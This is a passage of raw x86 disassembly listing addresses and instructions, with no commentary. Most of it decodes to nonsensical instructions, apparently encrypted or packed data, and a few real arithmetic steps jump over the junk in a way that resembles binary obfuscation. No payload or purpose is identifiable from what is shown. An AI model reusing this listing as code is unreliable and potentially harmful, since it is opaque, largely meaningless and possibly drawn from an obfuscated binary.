  40b9f1:	and    DWORD PTR [ebp-0x79],ebx
  40b9f4:	int3   
  40b9f5:	mov    ah,0x67
  40b9f7:	daa    
  40b9f8:	cmp    eax,0xcf6464b4
  40b9fd:	and    esp,DWORD PTR ds:0x544b1c5c
  40ba03:	pop    ecx
  40ba04:	ins    DWORD PTR es:[edi],dx
  40ba05:	cs clc 
  40ba07:	jo     0x40ba12
  40ba09:	or     BYTE PTR [ecx],bl
  40ba0b:	cmp    al,0x85
  40ba0d:	push   ds
  40ba0e:	add    eax,0x72ff6229
  40ba13:	sbb    dh,BYTE PTR [esi+0x44]
  40ba16:	mov    esp,0x61abdd4d
  40ba1b:	mov    edx,0xe356c33
  40ba20:	fisubr WORD PTR [edi-0x52]
  40ba23:	mov    ecx,0x1f432656
  40ba28:	xchg   esi,eax
  40ba29:	jno    0x40b9c2
  40ba2b:	int    0xd9
  40ba2d:	or     bh,BYTE PTR [eax]
  40ba2f:	arpl   WORD PTR [ebx-0x72],dx
  40ba32:	dec    eax
  40ba33:	mov    ebx,DWORD PTR [edx]
  40ba35:	stos   DWORD PTR es:[edi],eax
  40ba36:	jb     0x40ba4c
  40ba38:	mov    al,ds:0x83465a76
  40ba3d:	mov    BYTE PTR [edx+0x2b],0x4b
  40ba41:	adc    DWORD PTR [ecx],edi
  40ba43:	loope  0x40ba4e
  40ba45:	mov    bh,0xb7
  40ba47:	sbb    BYTE PTR [ecx-0x4ef0dd00],0xc3
  40ba4e:	aam    0x6e
  40ba50:	xor    ebp,DWORD PTR [ecx+0x6]
  40ba53:	test   DWORD PTR [edx+0x4b330c0c],esi
  40ba59:	push   edi
  40ba5a:	outs   dx,DWORD PTR ds:[esi]
  40ba5b:	mov    dh,0x54
  40ba5d:	in     eax,0x19
  40ba5f:	xlat   BYTE PTR ds:[ebx]
  40ba60:	pop    edx
  40ba61:	imul   esp,DWORD PTR [edx],0x280e2430
  40ba67:	aas    
  40ba68:	and    bh,BYTE PTR [ecx]
  40ba6a:	ds retf 
  40ba6c:	jmp    0x40b9f3
  40ba6e:	das    
  40ba6f:	cmc    
  40ba70:	xlat   BYTE PTR ds:[ebx]
  40ba71:	xlat   BYTE PTR ds:[ebx]
  40ba72:	jb     0x40ba11
  40ba74:	addr16 and eax,0xa39a5d8c
  40ba7a:	test   DWORD PTR [esi],esp
  40ba7c:	sbb    ebp,DWORD PTR [edi-0x56]
  40ba7f:	mov    esi,0x1fea3b99
  40ba84:	mov    eax,0xe86e135d
  40ba89:	cs wrmsr 
  40ba8c:	(bad)  
  40ba8d:	fld    DWORD PTR [ebx-0x6b]
  40ba90:	mov    al,ds:0xd9c2af15
  40ba95:	inc    esp
  40ba96:	(bad)  
  40ba97:	dec    esi
  40ba98:	add    al,0xd9
  40ba9a:	push   ds
  40ba9b:	popa   
  40ba9c:	inc    ebp
  40ba9d:	xlat   BYTE PTR ds:[ebx]
  40ba9e:	pop    edx
  40ba9f:	repz and BYTE PTR [ebp-0x45],cl
  40baa3:	je     0x40ba30
  40baa5:	push   ebp
  40baa6:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	jecxz  0x40ba77
  40bace:	fdiv   DWORD PTR [eax-0x6b]
  40bad1:	cmp    DWORD PTR [esp+edi*2-0x36],0x79
  40bad6:	jl     0x40bb54
  40bad8:	add    DWORD PTR ss:[edx+0x7ec3ae0b],edx
  40badf:	xchg   edx,eax
  40bae0:	retf   
  40bae1:	pushf  
  40bae2:	pop    ss
  40bae3:	mov    dl,0xe3
  40bae5:	inc    ebx
  40bae6:	(bad)  
  40bae7:	xchg   esi,eax
  40bae8:	call   0x782d:0xf022f950
  40baef:	lahf   
  40baf0:	push   esp
  40baf1:	pop    edx
  40baf2:	test   dh,dh
  40baf4:	pop    ecx
  40baf5:	pop    edx
  40baf6:	pop    esi
  40baf7:	inc    esp
  40baf8:	push   cs
  40baf9:	push   0xe36c88d2
  40bafe:	pop    es
  40baff:	xchg   ebx,eax
  40bb00:	sbb    BYTE PTR [ebp+0xb78cb84],0xaa
  40bb07:	inc    ebp
  40bb08:	popf   
  40bb09:	mov    bl,0x9b
  40bb0b:	pop    ebx
  40bb0c:	sub    ebx,ecx
  40bb0e:	add    al,0x9f
  40bb10:	shl    DWORD PTR [ebx-0x1ab34cb1],0x2c
  40bb17:	xor    eax,0x7c998000
  40bb1c:	add    eax,DWORD PTR [esi+0x5c]
  40bb1f:	xchg   DWORD PTR [ebx+edx*8],esi
  40bb22:	xlat   BYTE PTR ds:[ebx]
  40bb23:	dec    DWORD PTR [eax]
  40bb25:	push   esp
  40bb26:	add    dh,BYTE PTR [edi-0x441c7cad]
  40bb2c:	es jge 0x40bad9
  40bb2f:	scas   eax,DWORD PTR es:[edi]
  40bb30:	push   edx
  40bb31:	cmp    DWORD PTR [ebp-0xe],0xe3a9cf37
  40bb38:	xchg   esp,eax
  40bb39:	out    0x93,al
  40bb3b:	mov    dl,0xc2
  40bb3d:	sub    eax,0x881dee63
  40bb42:	or     DWORD PTR [edx],edx
  40bb44:	push   esi
  40bb45:	das    
  40bb46:	mov    eax,0x90c76ee0
  40bb4b:	push   esp
  40bb4c:	mov    DWORD PTR [ebx+0x10],ebp
  40bb4f:	inc    ebx
  40bb50:	sti    
  40bb51:	rcr    ch,cl
  40bb53:	add    BYTE PTR [edx+ebx*4],cl
  40bb56:	or     BYTE PTR [ebp+0x57],bh
  40bb59:	mov    ah,0x34
  40bb5b:	shr    BYTE PTR [edi-0x38],cl
  40bb5e:	xlat   BYTE PTR ds:[ebx]
  40bb5f:	cmp    eax,0xcc46a748
  40bb64:	xchg   esp,eax
  40bb65:	psllw  mm7,QWORD PTR [ebx]
  40bb68:	jmp    0x40baf6
  40bb6a:	adc    eax,0x698d05b9
  40bb6f:	lods   al,BYTE PTR ds:[esi]
  40bb70:	xchg   esi,eax
  40bb71:	and    ebp,esi
  40bb73:	jmp    0x40bb48
  40bb75:	mov    DWORD PTR [ecx],ebx
  40bb77:	adc    al,0x34
  40bb79:	pop    ecx
  40bb7a:	test   al,0xb2
  40bb7c:	sub    ah,BYTE PTR [edi+esi*2]
  40bb7f:	shr    DWORD PTR [ebx+0x3d56993],cl
  40bb85:	fwait
  40bb86:	push   ebx
  40bb87:	fucom  st(6)
  40bb89:	push   es
  40bb8a:	push   ebx
  40bb8b:	push   ss
  40bb8c:	xor    BYTE PTR [edx+0xf504522],bl
  40bb92:	mov    al,0x24
  40bb94:	mov    edx,0x51243a5d
  40bb99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9a:	(bad)  
  40bb9b:	pop    edi
  40bb9c:	out    dx,al
  40bb9d:	ja     0x40bc0f
  40bb9f:	sar    BYTE PTR [esp+ebp*8-0x4b09a285],cl
  40bba6:	seta   bh
  40bba9:	mov    esp,DWORD PTR ds:0x717fb409
  40bbaf:	cs je  0x40bba7
  40bbb2:	jns    0x40bbcf
  40bbb4:	mov    dh,0x58
  40bbb6:	add    dh,BYTE PTR [ebp-0x76be11ef]
  40bbbc:	stc    
  40bbbd:	adc    DWORD PTR [ecx-0x22ced046],ecx
  40bbc3:	mov    dl,0x99
  40bbc5:	(bad)  [esi]
  40bbc7:	loope  0x40bbde
  40bbc9:	sbb    DWORD PTR [edx],0xffffffb4
  40bbcc:	push   es
  40bbcd:	ja     0x40bc17
  40bbcf:	xchg   esi,eax
  40bbd0:	pop    ebp
  40bbd1:	inc    ebp
  40bbd2:	jl     0x40bc36
  40bbd4:	jp     0x40bb87
  40bbd6:	ret    0xdc4b
  40bbd9:	ins    BYTE PTR es:[edi],dx
  40bbda:	push   cs
  40bbdb:	les    ebx,FWORD PTR [edi]
  40bbdd:	xor    bl,BYTE PTR [eax-0x28]
  40bbe0:	js     0x40bb83
  40bbe2:	xor    BYTE PTR [ebx+0x5f],ch
  40bbe5:	mov    al,0x8d
  40bbe7:	lahf   
  40bbe8:	or     eax,0x4b870d30
  40bbed:	stos   BYTE PTR es:[edi],al
  40bbee:	nop
  40bbef:	fld    st(2)
  40bbf1:	push   0xffffff91
  40bbf3:	mov    ?,WORD PTR [ebp-0x2b]
  40bbf6:	sub    eax,0x9843715
  40bbfb:	rcr    BYTE PTR [ebp+0xf886f23],0x1f
  40bc02:	jb     0x40bbd4
  40bc04:	imul   edi,DWORD PTR [ebx],0xffffffd2
  40bc07:	mov    ds:0x940b3f4a,al
  40bc0c:	fmul   QWORD PTR [ebx+ebp*8-0x6c3ca8cb]
  40bc13:	inc    ebx
  40bc14:	mov    al,0xb2
  40bc16:	les    eax,FWORD PTR [ecx-0x1]
  40bc19:	adc    eax,0xb20f09b3
  40bc1e:	add    al,0xda
  40bc20:	push   eax
  40bc21:	mul    BYTE PTR [ebp+0x20]
  40bc24:	iret   
  40bc25:	(bad)  
  40bc26:	or     ebp,ebp
  40bc28:	pop    esp
  40bc29:	inc    eax
  40bc2a:	setbe  BYTE PTR [ebx+esi*4+0x60]
  40bc2f:	aaa    
  40bc30:	ret    0x3df
  40bc33:	and    al,0x48
  40bc35:	sub    bh,BYTE PTR [esi-0x32]
  40bc38:	mov    dl,0xe0
  40bc3a:	jns    0x40bc7a
  40bc3c:	repnz add al,0xad
  40bc3f:	sub    eax,0xf837bbc
  40bc44:	ss jbe 0x40bc54
  40bc47:	push   ebp
  40bc48:	daa    
  40bc49:	stos   BYTE PTR es:[edi],al
  40bc4a:	nop
  40bc4b:	sub    ecx,esi
  40bc4d:	inc    esi
  40bc4e:	ret    
  40bc4f:	jb     0x40bc9f
  40bc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc52:	in     al,dx
  40bc53:	arpl   WORD PTR [ecx+0x2d4b8ad0],di
  40bc59:	mov    ebx,0x1f8b6b04
  40bc5e:	push   ebx
  40bc5f:	lahf   
  40bc60:	or     eax,0x20757264
  40bc65:	mov    dh,BYTE PTR [ebp-0x58]
  40bc68:	mov    cl,ah
  40bc6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc6b:	int3   
  40bc6c:	aad    0x5e
  40bc6e:	ret    
  40bc6f:	dec    edi
  40bc70:	stos   DWORD PTR es:[edi],eax
  40bc71:	jno    0x40bc5e
  40bc73:	sub    esi,DWORD PTR [edi+ebx*2-0x1d]
  40bc77:	cmp    DWORD PTR [eax-0x6],eax
  40bc7a:	sar    DWORD PTR [ecx-0x20],cl
  40bc7d:	dec    ecx
  40bc7e:	mov    ebp,0x70230476
  40bc83:	das    
  40bc84:	mov    al,ds:0xdc3438c3
  40bc89:	lods   al,BYTE PTR ds:[esi]
  40bc8a:	mov    ecx,0x3a1133fc
  40bc8f:	mov    eax,cs:0x193af326
  40bc95:	lahf   
  40bc96:	lea    edx,[ebx]
  40bc98:	int    0xc3
  40bc9a:	mov    ebx,0x60ee764e
  40bc9f:	(bad)  
  40bca0:	ret    0x958a
  40bca3:	ret    
  40bca4:	(bad)  [esi+0x5866ee41]
  40bcaa:	inc    ebp
  40bcab:	mov    bl,0x70
  40bcad:	adc    DWORD PTR [ecx],0xffffffdd
  40bcb0:	add    al,BYTE PTR [edx+0x3e6b2b79]
  40bcb6:	sub    al,0x2c
  40bcb8:	push   edi
  40bcb9:	xor    al,0x71
  40bcbb:	stos   DWORD PTR es:[edi],eax
  40bcbc:	mov    DWORD PTR [edi+0x2f],ebx
  40bcbf:	add    DWORD PTR [esi-0x76],0xffffffe3
  40bcc3:	jecxz  0x40bce7
  40bcc5:	pusha  
  40bcc6:	mov    esi,0x556d9fcf
  40bccb:	ffree  st(4)
  40bccd:	add    cl,bh
  40bccf:	sub    al,0x26
  40bcd1:	jno    0x40bcba
  40bcd3:	mov    bl,0x48
  40bcd5:	xchg   DWORD PTR [ecx+0x3846b701],esp
  40bcdb:	dec    edi
  40bcdc:	pop    ds
  40bcdd:	ja     0x40bd2e
  40bcdf:	(bad)  
  40bce0:	retf   
  40bce1:	in     al,dx
  40bce2:	or     cl,BYTE PTR es:[ecx]
  40bce5:	test   bh,al
  40bce7:	sub    DWORD PTR [eax-0x3f],0x30
  40bceb:	arpl   bp,bx
  40bced:	nop    ebx
  40bcf0:	das    
  40bcf1:	mov    ecx,0x547b4a4f
  40bcf6:	pushf  
  40bcf7:	enter  0x574b,0xff
  40bcfb:	mov    ebx,0x9152912c
  40bd00:	pop    eax
  40bd01:	into   
  40bd02:	pop    ebp
  40bd03:	jg     0x40bd6a
  40bd05:	and    BYTE PTR [edx+0x277cfa8f],cl
  40bd0b:	push   edi
  40bd0c:	inc    ecx
  40bd0d:	lods   eax,DWORD PTR ds:[esi]
  40bd0e:	leave  
  40bd0f:	xchg   ebx,eax
  40bd10:	popa   
  40bd11:	aad    0x9c
  40bd13:	cmc    
  40bd14:	(bad)  
  40bd15:	scas   al,BYTE PTR es:[edi]
  40bd16:	sub    ecx,edx
  40bd18:	mov    es,WORD PTR [edx-0xd]
  40bd1b:	mov    esp,0x6645d750
  40bd20:	stos   BYTE PTR es:[edi],al
  40bd21:	mov    ch,0xf3
  40bd23:	mov    ecx,DWORD PTR [ebx+ecx*2+0x32]
  40bd27:	out    dx,al
  40bd28:	sub    bl,BYTE PTR [ebx]
  40bd2a:	xchg   ebp,eax
  40bd2b:	popa   
  40bd2c:	sbb    edi,DWORD PTR ds:0x6ae697
  40bd32:	nop
  40bd33:	mov    al,ds:0xbe53964a
  40bd38:	jl     0x40bced
  40bd3a:	sbb    ebp,ebx
  40bd3c:	xchg   DWORD PTR [ebx+0x6b],ecx
  40bd3f:	or     ebx,edi
  40bd41:	aad    0x43
  40bd43:	sahf   
  40bd44:	mov    BYTE PTR [edx+0x6f08b2b1],bh
  40bd4a:	or     al,0x7a
  40bd4c:	mov    ch,0xfd
  40bd4e:	inc    edx
  40bd4f:	ja     0x40bd1c
  40bd51:	popf   
  40bd52:	mov    ebp,0x8842f5bc
  40bd57:	dec    ebx
  40bd58:	xor    cl,BYTE PTR [ecx]
  40bd5a:	jo     0x40bd0d
  40bd5c:	dec    eax
  40bd5d:	mov    ds,WORD PTR [ecx-0x169b3ceb]
  40bd63:	ror    DWORD PTR [ebx-0x585b7c7c],1
  40bd69:	jle    0x40bd31
  40bd6b:	or     DWORD PTR [eax+eax*8],0x60
  40bd6f:	pusha  
  40bd70:	push   ds
  40bd71:	mov    ebx,0x6f41b762
  40bd76:	xor    al,0x91
  40bd78:	sbb    al,0xc3
  40bd7a:	sbb    al,0x7e
  40bd7c:	and    eax,edi
  40bd7e:	jp     0x40bdc0
  40bd80:	int3   
  40bd81:	es dec edx
  40bd83:	add    DWORD PTR [edi+0xf9e2366],esp
  40bd89:	pop    ecx
  40bd8a:	cmp    al,0xdf
  40bd8c:	sub    al,0x96
  40bd8e:	test   eax,0xd047e111
  40bd93:	xchg   esp,eax
  40bd94:	mov    esi,DWORD PTR [ebp-0x77eefeef]
  40bd9a:	loope  0x40bd22
  40bd9c:	ins    BYTE PTR es:[edi],dx
  40bd9d:	jno    0x40bdc8
  40bd9f:	faddp  st(7),st
  40bda1:	mov    DWORD PTR [ecx+edi*2-0x47],ecx
  40bda5:	push   ss
  40bda6:	ins    BYTE PTR es:[edi],dx
  40bda7:	fsubp  st(3),st
  40bda9:	jl     0x40bddc
  40bdab:	cmp    ebx,DWORD PTR [edi+0x52]
  40bdae:	jns    0x40bd7f
  40bdb0:	sub    esp,DWORD PTR ds:[di-0x74]
  40bdb5:	into   
  40bdb6:	bound  edx,QWORD PTR [edi+0x8]
  40bdb9:	adc    eax,0xd28b0fea
  40bdbe:	jb     0x40bdfe
  40bdc0:	in     eax,0xdf
  40bdc2:	js     0x40be08
  40bdc4:	inc    eax
  40bdc5:	imul   edi,DWORD PTR [eax],0xffffffc7
  40bdc8:	and    DWORD PTR [edx],edx
  40bdca:	or     eax,0xb07a9427
  40bdcf:	jmp    0x40bd9c
  40bdd1:	cld    
  40bdd2:	pop    ds
  40bdd3:	fucomp st(0)
  40bdd5:	xor    DWORD PTR [edx-0x18],ecx
  40bdd8:	scas   al,BYTE PTR es:[edi]
  40bdd9:	push   0x67213c06
  40bdde:	dec    esi
  40bddf:	jbe    0x40bdb0
  40bde1:	dec    ebp
  40bde2:	inc    eax
  40bde3:	or     BYTE PTR [ecx],dh
  40bde5:	cwde   
  40bde6:	fs mov ebx,0x1e4d9d84
  40bdec:	mul    DWORD PTR ds:0xd4b5f952
  40bdf2:	jge    0x40be19
  40bdf4:	pop    es
  40bdf5:	mov    bl,0x7d
  40bdf7:	or     eax,0x2cddff06
  40bdfc:	inc    edi
  40bdfd:	(bad)  [edi]
  40bdff:	sbb    ebx,ebp
  40be01:	sar    DWORD PTR [edi],cl
  40be03:	sbb    al,0x22
  40be05:	shl    BYTE PTR [edi],1
  40be07:	cmp    DWORD PTR [esi],ebx
  40be09:	out    dx,al
  40be0a:	outs   dx,DWORD PTR ds:[esi]
  40be0b:	adc    al,0x58
  40be0d:	jmp    0x40bdb9
  40be0f:	push   ss
  40be10:	mov    dl,0x2b
  40be12:	sbb    eax,0xd176b846
  40be17:	inc    ebx
  40be18:	pop    edi
  40be19:	or     ecx,DWORD PTR ds:0x425e9f50
  40be1f:	adc    eax,DWORD PTR [edi+0x78]
  40be22:	add    ah,BYTE PTR [ebx+0x30]
  40be25:	loope  0x40bdb5
  40be27:	call   0xf222:0x5952145a
  40be2e:	mov    DWORD PTR [ebp-0x24],edx
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	pushf  
  40be66:	push   edx
  40be68:	(bad)  
  40be69:	arpl   WORD PTR [esp+edi*2+0x7c79ca7c],cx
  40be70:	jl     0x40be5b
  40be72:	in     eax,dx
  40be73:	xchg   BYTE PTR ds:0xb1d19dec,dl
  40be79:	and    ebp,DWORD PTR [ebx]
  40be7b:	mov    cl,0x50
  40be7d:	push   ecx
  40be7e:	repz sbb DWORD PTR [ebp+0x7e],ecx
  40be82:	ins    BYTE PTR es:[edi],dx
  40be83:	or     eax,0x5d5da884
  40be88:	imul   ebp,DWORD PTR [ebx-0x65],0xb4c4e5d8
  40be8f:	cmp    ebx,DWORD PTR [edx+0x38]
  40be92:	lahf   
  40be93:	xchg   edx,eax
  40be94:	lds    edx,FWORD PTR [eax+ebx*4]
  40be97:	mov    cl,0x9c
  40be99:	and    esp,DWORD PTR [ebx-0x7f]
  40be9c:	add    BYTE PTR [ebx],bl
  40be9e:	lock rcl BYTE PTR [ecx+0x3da1a901],1
  40bea5:	in     eax,0x2
  40bea7:	jo     0x40bf24
  40bea9:	scas   eax,DWORD PTR es:[edi]
  40beaa:	xchg   ecx,eax
  40beab:	daa    
  40beac:	adc    ebp,ebp
  40beae:	sti    
  40beaf:	int    0x4c
  40beb1:	pop    ebx
  40beb2:	pop    esi
  40beb3:	or     DWORD PTR [ebx+ebx*1],ebp
  40beb6:	rcl    BYTE PTR [ebx+0x79eacdb5],cl
  40bebc:	(bad)  
  40bebe:	pop    esi
  40bebf:	add    DWORD PTR [ebp+0x4b],ecx
  40bec2:	retf   
  40bec3:	jl     0x40be9b
  40bec5:	cmp    al,0x8f
  40bec7:	jbe    0x40bf39
  40bec9:	mov    al,BYTE PTR [esi]
  40becb:	nop
  40becc:	push   0x45345a81
  40bed1:	xchg   edi,eax
  40bed2:	mov    ecx,cr7
  40bed5:	into   
  40bed6:	add    edx,eax
  40bed8:	pop    edx
  40bed9:	retf   0xe719
  40bedc:	shl    DWORD PTR [ebx+0x1],cl
  40bedf:	jmp    0x87dc486a
  40bee4:	fisubr WORD PTR [esi-0x3da498a]
  40beea:	mov    ebx,esp
  40beec:	outs   dx,DWORD PTR ds:[esi]
  40beed:	jle    0x40bf3c
  40beef:	adc    DWORD PTR [eax],0xe3d7298a
  40bef5:	xor    al,0x13
  40bef7:	sbb    al,0xf9
  40bef9:	mov    al,ds:0x7ce1f584
  40befe:	js     0x40bee6
  40bf00:	push   esp
  40bf01:	mov    bh,0x48
  40bf03:	or     eax,0x20fd1bd7
  40bf08:	(bad)  
  40bf09:	fadd   st,st(1)
  40bf0b:	or     ecx,DWORD PTR [ebx-0x73]
  40bf0e:	mov    esp,0x926669ff
  40bf13:	mov    ecx,0x680284bc
  40bf18:	(bad)  
  40bf19:	xchg   ebp,eax
  40bf1a:	loopne 0x40bf74
  40bf1c:	repz mov ah,dh
  40bf1f:	out    0x86,al
  40bf21:	mov    ds:0x3dbff535,eax
  40bf26:	daa    
  40bf27:	gs pop ss
  40bf29:	mov    al,ds:0xbacd1ee
  40bf2e:	daa    
  40bf2f:	pop    esi
  40bf30:	mov    ch,0xa8
  40bf32:	scas   al,BYTE PTR es:[edi]
  40bf33:	cs mov edi,0xbc18bde
  40bf39:	ficomp WORD PTR [ecx+0x12]
  40bf3c:	test   BYTE PTR [esi+0x19194c9d],dh
  40bf42:	in     eax,dx
  40bf43:	xor    esi,ebx
  40bf45:	push   es
  40bf46:	pop    ecx
  40bf47:	popf   
  40bf48:	push   edx
  40bf49:	dec    edx
  40bf4a:	fsubr  DWORD PTR [ebx-0x55]
  40bf4d:	or     BYTE PTR [esi+edi*1+0x511b013c],ch
  40bf54:	mov    bh,0x50
  40bf56:	aam    0x89
  40bf58:	je     0x40bfc8
  40bf5a:	outs   dx,DWORD PTR ds:[esi]
  40bf5b:	jecxz  0x40bfd2
  40bf5d:	cmp    eax,0x753de842
  40bf62:	xchg   esp,eax
  40bf63:	repnz (bad) 
  40bf65:	pusha  
  40bf66:	push   es
  40bf67:	mov    esi,0x64f3e102
  40bf6c:	aaa    
  40bf6d:	imul   DWORD PTR [edi-0x3afd8189]
  40bf73:	sbb    BYTE PTR [esi-0x45],ah
  40bf76:	lock inc edi
  40bf78:	test   al,0x57
  40bf7a:	and    al,0x63
  40bf7c:	cli    
  40bf7d:	es out dx,eax
  40bf7f:	push   esp
  40bf80:	pop    edi
  40bf81:	push   esi
  40bf82:	cld    
  40bf83:	aam    0x54
  40bf85:	lods   al,BYTE PTR ds:[esi]
  40bf86:	add    edi,DWORD PTR [edi-0x73]
  40bf89:	xor    al,0xf8
  40bf8b:	aam    0x9c
  40bf8d:	les    edx,FWORD PTR [ebx+0x7c]
  40bf90:	ret    
  40bf91:	nop
  40bf92:	xchg   edx,eax
  40bf93:	fmul   QWORD PTR [ecx-0x2512dc4c]
  40bf99:	cmc    
  40bf9a:	std    
  40bf9b:	aas    
  40bf9c:	daa    
  40bf9d:	jmp    0xdcdc:0x9cf55ec5
  40bfa4:	mov    cl,0x42
  40bfa6:	sbb    al,BYTE PTR [eax+ebp*1]
  40bfa9:	ja     0x40bfd3
  40bfab:	xor    BYTE PTR [ebx-0x53e2b0f3],dh
  40bfb1:	push   eax
  40bfb2:	jne    0x40bfde
  40bfb4:	dec    esi
  40bfb5:	stos   BYTE PTR es:[edi],al
  40bfb6:	stos   DWORD PTR es:[edi],eax
  40bfb7:	in     eax,dx
  40bfb8:	ins    DWORD PTR es:[edi],dx
  40bfb9:	fstp   TBYTE PTR [ecx+0x18e5e548]
  40bfbf:	pop    ds
  40bfc0:	sti    
  40bfc1:	inc    esp
  40bfc2:	or     esp,edi
  40bfc4:	mov    eax,ds:0x1d63b3ca
  40bfc9:	lea    ecx,[esi+ebx*4]
  40bfcc:	push   ds
  40bfcd:	cmp    edi,DWORD PTR [ebx-0x3d]
  40bfd0:	jge    0x40bf6d
  40bfd2:	inc    esp
  40bfd3:	pop    eax
  40bfd4:	(bad)  
  40bfd5:	and    ch,BYTE PTR [eax+0x61a385f9]
  40bfdb:	mov    dl,0x38
  40bfdd:	cmp    DWORD PTR [eax],ebp
  40bfdf:	sub    BYTE PTR [ebx],bh
  40bfe1:	dec    eax
  40bfe2:	jmp    0x40c016
  40bfe4:	je     0x40bfec
  40bfe6:	mov    ch,0x19
  40bfe8:	sub    ebp,ebx
  40bfea:	mov    ebx,0x44903c1
  40bfef:	test   eax,0xd9e78c25
  40bff4:	xor    DWORD PTR [edx],eax
  40bff6:	pop    ebp
  40bff7:	(bad)  
  40bff8:	div    DWORD PTR [edx+0x37]
  40bffb:	mov    WORD PTR [ebp-0xa601ea0],ds
  40c001:	xchg   edx,eax
  40c002:	and    DWORD PTR [eax+eax*1],ebp
  40c005:	mov    bh,0x9f
  40c007:	mov    ebx,0x1a8bc0c9
  40c00c:	jle    0x40bfed
  40c00e:	add    edx,DWORD PTR [edi-0x55038d5]
  40c014:	dec    esi
  40c015:	cmc    
  40c016:	(bad)  
  40c017:	int    0x60
  40c019:	mov    ebx,0x654ce45a
  40c01e:	pop    ss
  40c01f:	or     al,0x56
  40c021:	mov    WORD PTR [eax+ebp*2-0x291541ce],cs
  40c028:	enter  0xd654,0xf3
  40c02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02d:	pushf  
  40c02e:	mov    ah,0xff
  40c030:	jb     0x40bfe0
  40c032:	dec    eax
  40c033:	add    BYTE PTR [edx],al
  40c035:	dec    eax
  40c036:	mov    ebx,DWORD PTR [ebx-0x39]
  40c039:	shr    DWORD PTR [ebx-0x53ce3304],0xd7
  40c040:	fadd   st,st(3)
  40c042:	fiadd  WORD PTR [ecx]
  40c044:	push   ds
  40c045:	stos   BYTE PTR es:[edi],al
  40c046:	jnp    0x40c0a8
  40c048:	fcom   DWORD PTR [ebx]
  40c04a:	and    dh,BYTE PTR [edi-0x3727c0dc]
  40c050:	adc    al,cl
  40c052:	aad    0x6c
  40c054:	out    dx,eax
  40c055:	call   DWORD PTR [edi]
  40c057:	adc    DWORD PTR [eax],edi
  40c059:	cmp    eax,DWORD PTR ds:0xf4566bff
  40c05f:	or     BYTE PTR [eax-0x1a1d848a],ah
  40c065:	push   edi
  40c066:	xor    esp,ecx
  40c068:	in     al,dx
  40c069:	fidivr WORD PTR [ebx-0x147866ab]
  40c06f:	dec    edi
  40c070:	push   edi
  40c071:	arpl   WORD PTR [ebx+0x76bdd1a9],bp
  40c077:	mov    dl,0xf2
  40c079:	outs   dx,BYTE PTR ds:[esi]
  40c07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07b:	xor    bl,BYTE PTR [esi+0x7e152231]
  40c081:	outs   dx,BYTE PTR ds:[esi]
  40c082:	mov    bh,0xe1
  40c084:	add    dl,ah
  40c086:	nop
  40c087:	es clc 
  40c089:	imul   ebx,ecx,0xf6cc4dd5
  40c08f:	or     esi,DWORD PTR [edi+0x5a52386a]
  40c095:	mov    BYTE PTR [edi+0x52ac2c40],al
  40c09b:	cmp    edi,esi
  40c09d:	cmp    eax,0xfc8bfbc5
  40c0a2:	stc    
  40c0a3:	sbb    DWORD PTR [esi+esi*4],0x2ad488d6
  40c0aa:	xor    ebp,esi
  40c0ac:	mov    al,ds:0x309caa12
  40c0b1:	popf   
  40c0b2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c0b4:	or     ch,BYTE PTR [ebp+0x4]
  40c0b7:	test   cl,ch
  40c0b9:	xor    DWORD PTR [esi-0x7f67ed96],ebp
  40c0bf:	aas    
  40c0c0:	push   ds
  40c0c1:	les    ebp,FWORD PTR [edx+0x52]
  40c0c4:	pop    ebx
  40c0c5:	in     al,0x8c
  40c0c7:	dec    esi
  40c0c8:	sbb    DWORD PTR [edi-0x3b],0xc6863f43
  40c0cf:	xchg   edx,edi
  40c0d1:	out    dx,eax
  40c0d2:	adc    al,0x63
  40c0d4:	lods   al,BYTE PTR ds:[esi]
  40c0d5:	push   ds
  40c0d6:	retf   0xc616
  40c0d9:	add    al,0x80
  40c0db:	xchg   DWORD PTR [esp+eiz*2],esp
  40c0de:	pop    ebx
  40c0df:	push   esp
  40c0e0:	mov    ebp,0x25bbd0ea
  40c0e5:	rcr    BYTE PTR [eax],1
  40c0e7:	dec    ebp
  40c0e8:	sub    dh,dh
  40c0ea:	leave  
  40c0eb:	xchg   edx,eax
  40c0ec:	dec    esp
  40c0ed:	repz sbb BYTE PTR [esi+0x3243c25e],bh
  40c0f4:	jle    0x40c081
  40c0f6:	mov    ebx,0xd6fbac73
  40c0fb:	mov    dh,0x34
  40c0fd:	dec    esp
  40c0fe:	cmp    DWORD PTR ds:0x67d98a49,edi
  40c104:	fstp   QWORD PTR [edi]
  40c106:	fist   WORD PTR ds:0x182ca302
  40c10c:	lds    ecx,FWORD PTR ds:0x2800db58
  40c112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c113:	pusha  
  40c114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c115:	xor    eax,0x39c7543d
  40c11a:	adc    DWORD PTR [eax-0x7745caa9],ebp
  40c120:	ds loopne 0x40c184
  40c123:	xor    eax,eax
  40c125:	mov    ch,0x5a
  40c127:	mov    ds:0x4fc9dc39,eax
